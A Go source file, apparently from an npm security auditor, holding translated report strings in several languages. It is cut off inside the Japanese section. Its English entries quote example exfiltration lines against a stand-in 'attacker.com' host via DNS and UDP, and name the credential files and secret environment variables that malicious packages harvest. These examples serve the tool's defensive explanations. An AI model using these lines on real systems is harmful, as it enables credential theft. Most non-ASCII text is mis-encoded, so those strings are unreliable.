package reporter

import (
	"fmt"

	"github.com/kluth/npm-security-auditter/internal/analyzer"
)

type Language string

const (
	LangEN  Language = "en"
	LangDE  Language = "de"
	LangFR  Language = "fr"
	LangES  Language = "es"
	LangIT  Language = "it"
	LangPT  Language = "pt"
	LangJP  Language = "jp"
	LangZH  Language = "zh"
	LangRU  Language = "ru"
	LangTLH Language = "tlh" // Klingon
	LangVUL Language = "vul" // Vulcan
	LangSIN Language = "sin" // Sindarin
)

var translations = map[Language]map[string]string{
	LangEN: {
		"title":              "npm Security Audit Report",
		"pkg_info":           "Package Information",
		"package":            "Package",
		"license":            "License",
		"maintainers":        "Maintainers",
		"repository":         "Repository",
		"created":            "Created",
		"versions":           "Versions",
		"published":          "published",
		"dependencies":       "Dependencies",
		"direct":             "direct",
		"install_scripts":    "Install Scripts",
		"scripts_yes":        "YES ‚Äî runs code on install",
		"scripts_none":       "None",
		"risk_assessment":    "Risk Assessment",
		"risk_level":         "Risk Level",
		"critical_risk":      "CRITICAL RISK",
		"moderate_risk":      "MODERATE RISK",
		"elevated_risk":      "ELEVATED RISK",
		"low_risk":           "LOW RISK",
		"score_label":        "Score: %d / 100",
		"analyzer_errors":    "Analyzer Errors",
		"no_issues":          "No issues found. Package appears safe.",
		"findings_summary":   "Findings Summary",
		"findings_detected":  "Issues detected",
		"total_findings":     "Total: %d findings across %d analyzers",
		"severity_critical":  "CRITICAL",
		"severity_high":      "HIGH",
		"severity_medium":    "MEDIUM",
		"severity_low":       "LOW",
		"finding_plural":     "finding",
		"findings_plural":    "findings",
		"findings_count":     "%s Findings (%d)",
		"analyzer_label":     "Analyzer: %s",
		"attack_scenario":    "Attack Scenario:",
		"remediation":        "Remediation Advice:",
		"analyzer_breakdown": "Per-Analyzer Breakdown",
		"clean":              "clean",
		"recommendations":    "Recommendations",
		"rec_critical":       "DO NOT install this package without thorough manual review",
		"rec_moderate":       "Review all HIGH and CRITICAL findings before installing",
		"rec_scripts":        "Install with --ignore-scripts and inspect scripts manually",
		"rec_typosquat":      "Verify you have the correct package name ‚Äî this looks like a typosquat",
		"rec_vuln":           "Check if vulnerabilities are fixed in a newer version",
		"rec_provenance":     "Prefer packages with build provenance",
		"rec_deps":           "Audit the full dependency tree",
		"rec_maintainer":     "Verify maintainer identity and check for recent ownership transfers",
		"rec_safe":           "No major concerns ‚Äî package appears safe for use",
		"audited_at":         "Audited at %s",
		"project_audit":      "Project Audit: %s",
		"packages_audited":   "Packages Audited: %d",
		"severity_critical_short": "C",
		"severity_high_short":     "H",
		"severity_medium_short":   "M",
		"severity_low_short":      "L",
		"csv_severity":       "Severity",
		"csv_analyzer":       "Analyzer",
		"csv_title":          "Title",
		"csv_description":    "Description",
		// Developer Handbook sections
		"executive_summary":       "EXECUTIVE SUMMARY",
		"action_checklist":        "Action Checklist",
		"findings_by_action":      "Findings by Remediation Action",
		"detailed_findings":       "Detailed Findings Reference",
		"detailed_findings_note":  "Full technical details for each finding follow below.",
		"quick_reference":         "Quick Reference Commands",
		"quick_ref_intro":         "Copy-paste commands for common operations:",
		"quick_ref_safe_install":  "Safe install (no scripts)",
		"quick_ref_inspect_scripts": "Inspect package contents",
		"quick_ref_check_deps":    "Check dependency tree",
		// Verdicts
		"verdict_critical": "‚õî DO NOT INSTALL ‚Äî Critical security issues detected",
		"verdict_review":   "‚ö†Ô∏è  REVIEW REQUIRED ‚Äî Investigate findings before installing",
		"verdict_caution":  "üìã PROCEED WITH CAUTION ‚Äî Minor issues detected",
		"verdict_safe":     "‚úÖ APPEARS SAFE ‚Äî No significant issues found",
		// Action items
		"action_do_not_install":   "Do NOT install this package without thorough manual review",
		"action_review_scripts":   "Review install scripts before running npm install",
		"action_verify_name":      "Verify package name is correct (potential typosquat)",
		"action_check_updates":    "Check for patched versions of known vulnerabilities",
		"action_verify_provenance": "Verify build provenance and supply chain",
		"action_verify_maintainer": "Verify maintainer identity and account status",
		"action_sandbox_detected": "Review sandbox-detected runtime behaviors",
		"action_use_ignore_scripts": "Consider using --ignore-scripts flag",
		"action_safe_to_install":  "Package appears safe to install",
		// Remediation action groups
		"action_group_block_install": "Block Installation ‚Äî Critical Issues",
		"action_group_review_scripts": "Review Scripts ‚Äî Manual Inspection Required",
		"action_group_verify_source": "Verify Source ‚Äî Trust & Provenance",
		"action_group_update_version": "Update Version ‚Äî Known Vulnerabilities",
		"action_group_audit_deps":    "Audit Dependencies ‚Äî Supply Chain",
		"action_group_monitor":       "Monitor ‚Äî Informational Findings",
		// Dynamic analysis findings
		"dynamic_timeout":            "Package loading timed out",
		"dynamic_timeout_desc":       "The package did not finish loading within the sandbox timeout. This may indicate an infinite loop, hanging network request, or intentional stalling.",
		"dynamic_timeout_exploit":    "Malicious packages may use timeouts to evade sandbox analysis:\n  while(true) { /* infinite loop */ }\n  await new Promise(r => setTimeout(r, 999999));\nThis prevents the sandbox from completing analysis.",
		"dynamic_timeout_remediation": "Manually inspect the package source code for infinite loops or blocking operations. Consider shorter timeouts in CI/CD.",
		"dynamic_eval_detected":      "Dynamic code execution detected",
		"dynamic_eval_remediation":   "eval() and Function constructor can execute arbitrary code. Inspect the package source to verify the code being executed is safe.",
		"dynamic_process_exec":       "Process execution attempt",
		"dynamic_process_remediation": "The package attempted to spawn a subprocess. This is a critical security concern as it can execute arbitrary commands on your system.",
		"dynamic_worker_threads":     "Worker thread creation blocked",
		"dynamic_worker_exploit":     "Worker threads can bypass main-thread sandboxing:\n  new Worker('./malicious.js')\nCode in workers runs in parallel with different isolation.",
		"dynamic_worker_remediation": "Worker threads are blocked in the sandbox. Review the package source to understand why workers are needed.",
		"dynamic_cluster_fork":       "Cluster fork attempt blocked",
		"dynamic_cluster_exploit":    "Cluster forking creates new processes:\n  cluster.fork()\nThis can bypass process-level isolation.",
		"dynamic_cluster_remediation": "Cluster forking is blocked in the sandbox. Review why the package attempts to fork processes.",
		"dynamic_network_request":    "Network connection attempt",
		"dynamic_network_remediation": "Unexpected network requests may indicate data exfiltration. Verify the destination and purpose of the connection.",
		"dynamic_dns_lookup":         "DNS lookup attempt",
		"dynamic_dns_exploit":        "DNS can exfiltrate data via subdomains:\n  dns.lookup(secret + '.attacker.com')\nData is encoded in the DNS query itself.",
		"dynamic_dns_remediation":    "DNS lookups may be legitimate or used for exfiltration. Verify the domains being queried.",
		"dynamic_udp_socket":         "UDP socket creation",
		"dynamic_udp_exploit":        "UDP sockets enable stealthy data exfiltration:\n  socket.send(data, port, 'attacker.com')\nUDP is connectionless and harder to monitor.",
		"dynamic_udp_remediation":    "Review why UDP sockets are needed. Legitimate uses include metrics, logging, and DNS.",
		"dynamic_tls_connection":     "TLS connection attempt",
		"dynamic_vm_usage":           "VM module usage detected",
		"dynamic_vm_exploit":         "The vm module can execute code in isolated contexts:\n  vm.runInNewContext(code)\nThis is sometimes used to bypass sandbox restrictions.",
		"dynamic_vm_remediation":     "Review why the package uses vm module. Some legitimate uses exist (templating, sandboxing), but it can also be used maliciously.",
		"dynamic_sensitive_file":     "Sensitive file access attempt",
		"dynamic_sensitive_file_exploit": "Access to sensitive files like ~/.ssh/id_rsa, ~/.npmrc, or .env can expose:\n  - SSH private keys (server access)\n  - npm tokens (package publish access)\n  - API keys and secrets",
		"dynamic_sensitive_file_remediation": "This is a critical security finding. The package should not need access to these files. Do not install without thorough review.",
		"dynamic_sensitive_env":      "Sensitive environment variable access",
		"dynamic_env_exploit":        "Environment variables often contain secrets:\n  NPM_TOKEN, AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN\nMalicious packages harvest these for exfiltration.",
		"dynamic_env_remediation":    "Review why the package accesses these environment variables. Use CI/CD secrets management to limit exposure.",
		"dynamic_env_enumeration":    "Environment variable enumeration",
		"sandbox_isolation_degraded": "Sandbox isolation degraded",
		"sandbox_isolation_degraded_desc": "The sandbox ran with degraded isolation. Namespace isolation failed but application-level blocking was applied.",
		"sandbox_no_isolation":       "Sandbox ran without kernel isolation",
		"sandbox_no_isolation_desc":  "The sandbox executed without network namespace isolation. Network calls were blocked at the application level only.",
		"sandbox_patch_errors":       "Sandbox module patching errors",
		// PDF report merging
		"findings_word":              "findings",
		"unique_issues":              "unique issues",
		"similar_instances":          "similar instances",
		"and":                        "and",
		"more_issues_truncated":      "more issues (see terminal output for full details)",
		"run_terminal_for_full":      "Run: auditter <package> for full details",
		// Reputation display
		"weekly_downloads":           "Weekly Downloads",
		"trusted_scope":              "Trusted Scope",
		"yes":                        "Yes",
		"reputation_adjusted":        "Reputation Adjusted",
		// Merged findings
		"merged_summary":             "%d total findings deduplicated to %d unique issues",
		"detailed_findings_merged_note": "Similar findings merged. Use --verbose to see all individual occurrences.",
		"verbose_hint":               "Use --verbose flag to see all individual findings.",
	},
	LangDE: {
		"title":              "npm Sicherheits-Audit Bericht",
		"pkg_info":           "Paket-Informationen",
		"package":            "Paket",
		"license":            "Lizenz",
		"maintainers":        "Maintainer",
		"repository":         "Repository",
		"created":            "Erstellt",
		"versions":           "Versionen",
		"published":          "ver√∂ffentlicht",
		"dependencies":       "Abh√§ngigkeiten",
		"direct":             "direkt",
		"install_scripts":    "Installations-Skripte",
		"scripts_yes":        "JA ‚Äî f√ºhrt Code bei Installation aus",
		"scripts_none":       "Keine",
		"risk_assessment":    "Risikobewertung",
		"risk_level":         "Risikostufe",
		"critical_risk":      "KRITISCHES RISIKO",
		"moderate_risk":      "MODERATES RISIKO",
		"elevated_risk":      "ERH√ñHTES RISIKO",
		"low_risk":           "GERINGES RISIKO",
		"score_label":        "Score: %d / 100",
		"analyzer_errors":    "Analyse-Fehler",
		"no_issues":          "Keine Probleme gefunden. Paket scheint sicher zu sein.",
		"findings_summary":   "Zusammenfassung der Befunde",
		"findings_detected":  "Probleme erkannt",
		"total_findings":     "Gesamt: %d Befunde von %d Analysatoren",
		"severity_critical":  "KRITISCH",
		"severity_high":      "HOCH",
		"severity_medium":    "MITTEL",
		"severity_low":       "NIEDRIG",
		"finding_plural":     "Befund",
		"findings_plural":    "Befunde",
		"findings_count":     "%s Befunde (%d)",
		"analyzer_label":     "Analysator: %s",
		"attack_scenario":    "Angriffsszenario:",
		"remediation":        "Behebung:",
		"analyzer_breakdown": "Aufschl√ºsselung pro Analysator",
		"clean":              "sauber",
		"recommendations":    "Empfehlungen",
		"rec_critical":       "Installieren Sie dieses Paket NICHT ohne gr√ºndliche manuelle Pr√ºfung",
		"rec_moderate":       "√úberpr√ºfen Sie alle HOCH- und KRITISCH-Befunde vor der Installation",
		"rec_scripts":        "Mit --ignore-scripts installieren und Skripte manuell pr√ºfen",
		"rec_typosquat":      "√úberpr√ºfen Sie den Paketnamen ‚Äî dies sieht nach Typosquatting aus",
		"rec_vuln":           "Pr√ºfen Sie, ob Schwachstellen in einer neueren Version behoben sind",
		"rec_provenance":     "Bevorzugen Sie Pakete mit Herkunftsnachweis (provenance)",
		"rec_deps":           "Pr√ºfen Sie den vollst√§ndigen Abh√§ngigkeitsbaum",
		"rec_maintainer":     "Identit√§t der Maintainer pr√ºfen und auf Besitzerwechsel achten",
		"rec_safe":           "Keine gr√∂√üeren Bedenken ‚Äî Paket scheint sicher zu sein",
		"audited_at":         "Gepr√ºft am %s",
		"project_audit":      "Projekt-Audit: %s",
		"packages_audited":   "Gepr√ºfte Pakete: %d",
		"severity_critical_short": "K",
		"severity_high_short":     "H",
		"severity_medium_short":   "M",
		"severity_low_short":      "N",
		"csv_severity":       "Schweregrad",
		"csv_analyzer":       "Analysator",
		"csv_title":          "Titel",
		"csv_description":    "Beschreibung",
		// Developer Handbook sections
		"executive_summary":       "ZUSAMMENFASSUNG",
		"action_checklist":        "Aktionsliste",
		"findings_by_action":      "Befunde nach Ma√ünahme gruppiert",
		"detailed_findings":       "Detaillierte Befunde",
		"detailed_findings_note":  "Vollst√§ndige technische Details zu jedem Befund folgen unten.",
		"quick_reference":         "Schnellreferenz-Befehle",
		"quick_ref_intro":         "Kopierbare Befehle f√ºr h√§ufige Operationen:",
		"quick_ref_safe_install":  "Sichere Installation (ohne Skripte)",
		"quick_ref_inspect_scripts": "Paketinhalt inspizieren",
		"quick_ref_check_deps":    "Abh√§ngigkeitsbaum pr√ºfen",
		// Verdicts
		"verdict_critical": "‚õî NICHT INSTALLIEREN ‚Äî Kritische Sicherheitsprobleme erkannt",
		"verdict_review":   "‚ö†Ô∏è  √úBERPR√úFUNG ERFORDERLICH ‚Äî Befunde vor Installation pr√ºfen",
		"verdict_caution":  "üìã MIT VORSICHT FORTFAHREN ‚Äî Kleinere Probleme erkannt",
		"verdict_safe":     "‚úÖ SCHEINT SICHER ‚Äî Keine signifikanten Probleme gefunden",
		// Action items
		"action_do_not_install":   "Installieren Sie dieses Paket NICHT ohne gr√ºndliche manuelle Pr√ºfung",
		"action_review_scripts":   "Installations-Skripte vor npm install √ºberpr√ºfen",
		"action_verify_name":      "Paketnamen verifizieren (m√∂gliches Typosquatting)",
		"action_check_updates":    "Auf gepatchte Versionen bekannter Schwachstellen pr√ºfen",
		"action_verify_provenance": "Build-Herkunft und Lieferkette verifizieren",
		"action_verify_maintainer": "Maintainer-Identit√§t und Kontostatus pr√ºfen",
		"action_sandbox_detected": "Sandbox-erkannte Laufzeitverhaltens pr√ºfen",
		"action_use_ignore_scripts": "Erw√§gen Sie die Verwendung des --ignore-scripts Flags",
		"action_safe_to_install":  "Paket scheint sicher zur Installation",
		// Remediation action groups
		"action_group_block_install": "Installation blockieren ‚Äî Kritische Probleme",
		"action_group_review_scripts": "Skripte pr√ºfen ‚Äî Manuelle Inspektion erforderlich",
		"action_group_verify_source": "Quelle verifizieren ‚Äî Vertrauen & Herkunft",
		"action_group_update_version": "Version aktualisieren ‚Äî Bekannte Schwachstellen",
		"action_group_audit_deps":    "Abh√§ngigkeiten pr√ºfen ‚Äî Lieferkette",
		"action_group_monitor":       "√úberwachen ‚Äî Informative Befunde",
		// Findings
		"Lifecycle script: postinstall": "Lebenszyklus-Skript: postinstall",
		"Lifecycle script: preinstall":  "Lebenszyklus-Skript: preinstall",
		"Lifecycle script: install":     "Lebenszyklus-Skript: install",
		"Network request detected":      "Netzwerkanfrage erkannt",
		"Dynamic code execution (eval/Function)": "Dynamische Code-Ausf√ºhrung (eval/Function)",
		"Process execution detected":    "Prozessausf√ºhrung erkannt",
		"Typosquatting pattern detected": "Typosquatting-Muster erkannt",
		"No provenance attestation":     "Kein Herkunftsnachweis (provenance)",
		"No registry signatures":        "Keine Registry-Signaturen",
		"Known vulnerability: %s":       "Bekannte Schwachstelle: %s",
		"Sensitive file access attempt": "Zugriff auf sensible Dateien versucht",
		"Binary distribution":           "Bin√§r-Distribution",
		"Unparseable repository URL":    "Nicht parsbare Repository-URL",
		"Sudden activity after long inactivity": "Pl√∂tzliche Aktivit√§t nach langer Inaktivit√§t",
		"No description":                "Keine Beschreibung",
		"Empty repository URL":          "Leere Repository-URL",
		// Dynamic analysis (German)
		"dynamic_timeout":            "Zeit√ºberschreitung beim Laden des Pakets",
		"dynamic_eval_detected":      "Dynamische Code-Ausf√ºhrung erkannt",
		"dynamic_process_exec":       "Prozessausf√ºhrungsversuch",
		"dynamic_worker_threads":     "Worker-Thread-Erstellung blockiert",
		"dynamic_cluster_fork":       "Cluster-Fork-Versuch blockiert",
		"dynamic_network_request":    "Netzwerkverbindungsversuch",
		"dynamic_dns_lookup":         "DNS-Abfrage erkannt",
		"dynamic_udp_socket":         "UDP-Socket-Erstellung",
		"dynamic_tls_connection":     "TLS-Verbindungsversuch",
		"dynamic_vm_usage":           "VM-Modul-Nutzung erkannt",
		"dynamic_sensitive_file":     "Zugriff auf sensible Datei",
		"dynamic_sensitive_env":      "Zugriff auf sensible Umgebungsvariablen",
		"dynamic_env_enumeration":    "Umgebungsvariablen-Aufz√§hlung",
		// PDF report merging
		"findings_word":              "Befunde",
		"unique_issues":              "eindeutige Probleme",
		"similar_instances":          "√§hnliche Instanzen",
		"and":                        "und",
		"more_issues_truncated":      "weitere Probleme (Terminal f√ºr vollst√§ndige Details)",
		"run_terminal_for_full":      "F√ºhren Sie aus: auditter <package> f√ºr vollst√§ndige Details",
		// Reputation display
		"weekly_downloads":           "W√∂chentliche Downloads",
		"trusted_scope":              "Vertrauensw√ºrdiger Scope",
		"yes":                        "Ja",
		"reputation_adjusted":        "Reputation ber√ºcksichtigt",
		// Merged findings
		"merged_summary":             "%d Gesamtbefunde auf %d eindeutige Probleme dedupliziert",
		"detailed_findings_merged_note": "√Ñhnliche Befunde zusammengef√ºhrt. Verwenden Sie --verbose f√ºr alle einzelnen Vorkommen.",
		"verbose_hint":               "Verwenden Sie --verbose um alle einzelnen Befunde zu sehen.",
	},
	LangFR: {
		"title":              "Rapport d'Audit de S√©curit√© npm",
		"pkg_info":           "Informations sur le Paquet",
		"package":            "Paquet",
		"license":            "Licence",
		"maintainers":        "Mainteneurs",
		"repository":         "D√©p√¥t",
		"created":            "Cr√©√©",
		"versions":           "Versions",
		"published":          "publi√©",
		"dependencies":       "D√©pendances",
		"direct":             "direct",
		"install_scripts":    "Scripts d'Installation",
		"scripts_yes":        "OUI ‚Äî ex√©cute du code √† l'installation",
		"scripts_none":       "Aucun",
		"risk_assessment":    "√âvaluation des Risques",
		"critical_risk":      "RISQUE CRITIQUE",
		"moderate_risk":      "RISQUE MOD√âR√â",
		"elevated_risk":      "RISQUE √âLEV√â",
		"low_risk":           "RISQUE FAIBLE",
		"score_label":        "Score: %d / 100",
		"analyzer_errors":    "Erreurs d'Analyse",
		"no_issues":          "Aucun probl√®me trouv√©. Le paquet semble s√ªr.",
		"findings_summary":   "R√©sum√© des R√©sultats",
		"total_findings":     "Total: %d r√©sultats via %d analyseurs",
		"severity_critical":  "CRITIQUE",
		"severity_high":      "HAUT",
		"severity_medium":    "MOYEN",
		"severity_low":       "FAIBLE",
		"finding_plural":     "r√©sultat",
		"findings_plural":    "r√©sultats",
		"findings_count":     "%s R√©sultats (%d)",
		"analyzer_label":     "Analyseur: %s",
		"attack_scenario":    "Sc√©nario d'Attaque:",
		"remediation":        "Conseil de Rem√©diation:",
		"analyzer_breakdown": "D√©tail par Analyseur",
		"clean":              "propre",
		"recommendations":    "Recommandations",
		"rec_critical":       "NE PAS installer ce paquet sans examen manuel approfondi",
		"rec_moderate":       "Examinez tous les r√©sultats HAUTS et CRITIQUES avant l'installation",
		"rec_scripts":        "Installer avec --ignore-scripts et inspecter les scripts manuellement",
		"rec_typosquat":      "V√©rifiez le nom du paquet ‚Äî cela ressemble √† du typosquatting",
		"rec_vuln":           "V√©rifiez si les vuln√©rabilit√©s sont corrig√©es dans une version plus r√©cente",
		"rec_provenance":     "Pr√©f√©rez les paquets avec provenance de build",
		"rec_deps":           "Auditez l'arbre complet des d√©pendances",
		"rec_maintainer":     "V√©rifiez l'identit√© du mainteneur et les transferts r√©cents de propri√©t√©",
		"rec_safe":           "Pas de pr√©occupations majeures ‚Äî le paquet semble s√ªr",
		"audited_at":         "Audit√© √† %s",
		"project_audit":      "Audit du Projet: %s",
		"packages_audited":   "Paquets Audit√©s: %d",
		"severity_critical_short": "C",
		"severity_high_short":     "H",
		"severity_medium_short":   "M",
		"severity_low_short":      "F",
		"csv_severity":       "S√©v√©rit√©",
		"csv_analyzer":       "Analyseur",
		"csv_title":          "Titre",
		"csv_description":    "Description",
		// Findings
		"Lifecycle script: postinstall": "Script de cycle de vie: postinstall",
		"Lifecycle script: preinstall":  "Script de cycle de vie: preinstall",
		"Lifecycle script: install":     "Script de cycle de vie: install",
		"Network request detected":      "Requ√™te r√©seau d√©tect√©e",
		"Dynamic code execution (eval/Function)": "Ex√©cution de code dynamique (eval/Function)",
		"Process execution detected":    "Ex√©cution de processus d√©tect√©e",
		"Typosquatting pattern detected": "Motif de typosquattage d√©tect√©",
		"No provenance attestation":     "Aucune attestation de provenance",
		"No registry signatures":        "Aucune signature de registre",
		"Sensitive file access attempt": "Tentative d'acc√®s √† des fichiers sensibles",
		"Binary distribution":           "Distribution binaire",
		"No description":                "Pas de description",
	},
	LangES: {
		"title":              "Informe de Auditor√≠a de Seguridad npm",
		"pkg_info":           "Informaci√≥n del Paquete",
		"package":            "Paquete",
		"license":            "Licencia",
		"maintainers":        "Mantenedores",
		"repository":         "Repositorio",
		"created":            "Creado",
		"versions":           "Versiones",
		"published":          "publicado",
		"dependencies":       "Dependencias",
		"direct":             "directo",
		"install_scripts":    "Scripts de Instalaci√≥n",
		"scripts_yes":        "S√ç ‚Äî ejecuta c√≥digo al instalar",
		"scripts_none":       "Ninguno",
		"risk_assessment":    "Evaluaci√≥n de Riesgos",
		"critical_risk":      "RIESGO CR√çTICO",
		"moderate_risk":      "RIESGO MODERADO",
		"elevated_risk":      "RIESGO ELEVADO",
		"low_risk":           "RIESGO BAJO",
		"score_label":        "Puntuaci√≥n: %d / 100",
		"analyzer_errors":    "Errores del Analizador",
		"no_issues":          "No se encontraron problemas. El paquete parece seguro.",
		"findings_summary":   "Resumen de Hallazgos",
		"total_findings":     "Total: %d hallazgos en %d analizadores",
		"severity_critical":  "CR√çTICO",
		"severity_high":      "ALTO",
		"severity_medium":    "MEDIO",
		"severity_low":       "BAJO",
		"finding_plural":     "hallazgo",
		"findings_plural":    "hallazgos",
		"findings_count":     "%s Hallazgos (%d)",
		"analyzer_label":     "Analizador: %s",
		"attack_scenario":    "Escenario de Ataque:",
		"remediation":        "Consejo de Remediaci√≥n:",
		"analyzer_breakdown": "Desglose por Analizador",
		"clean":              "limpio",
		"recommendations":    "Recomendaciones",
		"rec_critical":       "NO instale este paquete sin una revisi√≥n manual exhaustiva",
		"rec_moderate":       "Revise todos los hallazgos ALTOS y CR√çTICOS antes de instalar",
		"rec_scripts":        "Instale con --ignore-scripts e inspeccione los scripts manualmente",
		"rec_typosquat":      "Verifique que tiene el nombre correcto ‚Äî esto parece typosquatting",
		"rec_vuln":           "Compruebe si las vulnerabilidades se corrigen en una versi√≥n m√°s reciente",
		"rec_provenance":     "Prefiera paquetes con procedencia de compilaci√≥n",
		"rec_deps":           "Audite el √°rbol completo de dependencias",
		"rec_maintainer":     "Verifique la identidad del mantenedor y cambios recientes de propiedad",
		"rec_safe":           "Sin preocupaciones mayores ‚Äî el paquete parece seguro",
		"audited_at":         "Auditado el %s",
		"project_audit":      "Auditor√≠a del Proyecto: %s",
		"packages_audited":   "Paquetes Auditados: %d",
		"severity_critical_short": "C",
		"severity_high_short":     "A",
		"severity_medium_short":   "M",
		"severity_low_short":      "B",
		"csv_severity":       "Severidad",
		"csv_analyzer":       "Analizador",
		"csv_title":          "T√≠tulo",
		"csv_description":    "Descripci√≥n",
	},
	LangIT: {
		"title":              "Rapporto di Audit di Sicurezza npm",
		"pkg_info":           "Informazioni sul Pacchetto",
		"package":            "Pacchetto",
		"license":            "Licenza",
		"maintainers":        "Manutentori",
		"repository":         "Repository",
		"created":            "Creato",
		"versions":           "Versioni",
		"published":          "pubblicato",
		"dependencies":       "Dipendenze",
		"direct":             "diretta",
		"install_scripts":    "Script di Installazione",
		"scripts_yes":        "S√å ‚Äî esegue codice all'installazione",
		"scripts_none":       "Nessuno",
		"risk_assessment":    "Valutazione del Rischio",
		"critical_risk":      "RISCHIO CRITICO",
		"moderate_risk":      "RISCHIO MODERATO",
		"elevated_risk":      "RISCHIO ELEVATO",
		"low_risk":           "RISCHIO BASSO",
		"score_label":        "Punteggio: %d / 100",
		"analyzer_errors":    "Errori dell'Analizzatore",
		"no_issues":          "Nessun problema trovato. Il pacchetto sembra sicuro.",
		"findings_summary":   "Riepilogo dei Risultati",
		"total_findings":     "Totale: %d risultati in %d analizzatori",
		"severity_critical":  "CRITICA",
		"severity_high":      "ALTA",
		"severity_medium":    "MEDIA",
		"severity_low":       "BASSA",
		"finding_plural":     "risultato",
		"findings_plural":    "risultati",
		"findings_count":     "%s Risultati (%d)",
		"analyzer_label":     "Analizzatore: %s",
		"attack_scenario":    "Scenario di Attacco:",
		"remediation":        "Consiglio di Rimedio:",
		"analyzer_breakdown": "Dettaglio per Analizzatore",
		"clean":              "pulito",
		"recommendations":    "Raccomandazioni",
		"rec_critical":       "NON installare questo pacchetto senza un'approfondita revisione manuale",
		"rec_moderate":       "Rivedere tutti i risultati ALTI e CRITICI prima dell'installazione",
		"rec_scripts":        "Installare con --ignore-scripts e ispezionare gli script manualmente",
		"rec_typosquat":      "Verificare il nome del pacchetto ‚Äî sembra un typosquat",
		"rec_vuln":           "Controllare se le vulnerabilit√† sono risolte in una versione pi√π recente",
		"rec_provenance":     "Preferire pacchetti con provenienza della build",
		"rec_deps":           "Controllare l'intero albero delle dipendenze",
		"rec_maintainer":     "Verificare l'identit√† del manutentore e recenti cambi di propriet√†",
		"rec_safe":           "Nessuna preoccupazione maggiore ‚Äî il pacchetto sembra sicuro",
		"audited_at":         "Audit eseguito il %s",
		"project_audit":      "Audit del Progetto: %s",
		"packages_audited":   "Pacchetti Auditi: %d",
		"severity_critical_short": "C",
		"severity_high_short":     "A",
		"severity_medium_short":   "M",
		"severity_low_short":      "B",
		"csv_severity":       "Gravit√†",
		"csv_analyzer":       "Analizzatore",
		"csv_title":          "Titolo",
		"csv_description":    "Descrizione",
	},
	LangPT: {
		"title":              "Relat√≥rio de Auditoria de Seguran√ßa npm",
		"pkg_info":           "Informa√ß√µes do Pacote",
		"package":            "Pacote",
		"license":            "Licen√ßa",
		"maintainers":        "Mantenedores",
		"repository":         "Reposit√≥rio",
		"created":            "Criado",
		"versions":           "Vers√µes",
		"published":          "publicado",
		"dependencies":       "Depend√™ncias",
		"direct":             "direta",
		"install_scripts":    "Scripts de Instala√ß√£o",
		"scripts_yes":        "SIM ‚Äî executa c√≥digo na instala√ß√£o",
		"scripts_none":       "Nenhum",
		"risk_assessment":    "Avalia√ß√£o de Risco",
		"critical_risk":      "RISCO CR√çTICO",
		"moderate_risk":      "RISCO MODERADO",
		"elevated_risk":      "RISCO ELEVADO",
		"low_risk":           "RISCO BAIXO",
		"score_label":        "Pontua√ß√£o: %d / 100",
		"analyzer_errors":    "Erros do Analisador",
		"no_issues":          "Nenhum problema encontrado. O pacote parece seguro.",
		"findings_summary":   "Resumo das Descobertas",
		"total_findings":     "Total: %d descobertas em %d analisadores",
		"severity_critical":  "CR√çTICA",
		"severity_high":      "ALTA",
		"severity_medium":    "M√âDIA",
		"severity_low":       "BAIXA",
		"finding_plural":     "descoberta",
		"findings_plural":    "descobertas",
		"findings_count":     "%s Descobertas (%d)",
		"analyzer_label":     "Analisador: %s",
		"attack_scenario":    "Cen√°rio de Ataque:",
		"remediation":        "Conselho de Corre√ß√£o:",
		"analyzer_breakdown": "Detalhe por Analisador",
		"clean":              "limpio",
		"recommendations":    "Recomenda√ß√µes",
		"rec_critical":       "N√ÉO instale este pacote sem uma revis√£o manual minuciosa",
		"rec_moderate":       "Revise todas as descobertas ALTAS e CR√çTICAS antes de instalar",
		"rec_scripts":        "Instale com --ignore-scripts e inspecione os scripts manualmente",
		"rec_typosquat":      "Verifique o nome do pacote ‚Äî parece typosquatting",
		"rec_vuln":           "Verifique se as vulnerabilidades foram corrigidas em uma vers√£o mais recente",
		"rec_provenance":     "Prefira pacotes com proced√™ncia de compila√ß√£o",
		"rec_deps":           "Audite a √°rvore de depend√™ncias completa",
		"rec_maintainer":     "Verifique a identidade do mantenedor e mudan√ßas recentes de propriedade",
		"rec_safe":           "Sem preocupa√ß√µes maiores ‚Äî o pacote parece seguro",
		"audited_at":         "Auditado em %s",
		"project_audit":      "Auditoria do Projeto: %s",
		"packages_audited":   "Pacotes Auditados: %d",
		"severity_critical_short": "C",
		"severity_high_short":     "A",
		"severity_medium_short":   "M",
		"severity_low_short":      "B",
		"csv_severity":       "Gravidade",
		"csv_analyzer":       "Analisador",
		"csv_title":          "T√≠tulo",
		"csv_description":    "Descri√ß√£o",
	},
	LangJP: {
		"title":              "npm „Çª„Ç≠„É•„É™„ÉÜ„Ç£Áõ£Êüª„É¨„Éù„Éº„Éà",
		"pkg_info":           "„Éë„ÉÉ„Ç±„Éº„Ç∏ÊÉÖÂ†±",
		"package":            "„Éë„ÉÉ„Ç±„Éº„Ç∏",
		"license":            "„É©„Ç§„Çª„É≥„Çπ",
		"maintainers":        "„É°„É≥„ÉÜ„Éä„Éº",
		"repository":         "„É™„Éù„Ç∏„Éà„É™",
		"created":            "‰ΩúÊàêÊó•",
		"versions":           "„Éê„Éº„Ç∏„Éß„É≥Êï∞",
		"published":          "ÂÖ¨ÈñãÊ∏à„Åø",
		"dependencies":       "‰æùÂ≠òÈñ¢‰øÇ",
		"direct":             "Áõ¥Êé•",
		"install_scripts":    "„Ç§„É≥„Çπ„Éà„Éº„É´„Çπ„ÇØ„É™„Éó„Éà",
		"scripts_yes":        "„ÅÇ„Çä ‚Äî „Ç§„É≥„Çπ„Éà„Éº„É´ÊôÇ„Å´„Ç≥„Éº„Éâ„ÇíÂÆüË°å„Åó„Åæ„Åô",
		"scripts_none":       "„Å™„Åó",
		"risk_assessment":    "„É™„Çπ„ÇØË©ï‰æ°",
		"critical_risk":      "ÈáçÂ§ß„Å™„É™„Çπ„ÇØ",
		"moderate_risk":      "‰∏≠Á®ãÂ∫¶„ÅÆ„É™„Çπ„ÇØ",
		"elevated_risk":      "Ê≥®ÊÑè„ÅåÂøÖË¶Å„Å™„É™„Çπ„ÇØ",
		"low_risk":           "‰Ωé„ÅÑ„É™„Çπ„ÇØ",
		"score_label":        "„Çπ„Ç≥„Ç¢: %d / 100",
		"analyzer_errors":    "„Ç¢„Éä„É©„Ç§„Ç∂„Éº„Ç®„É©„Éº",
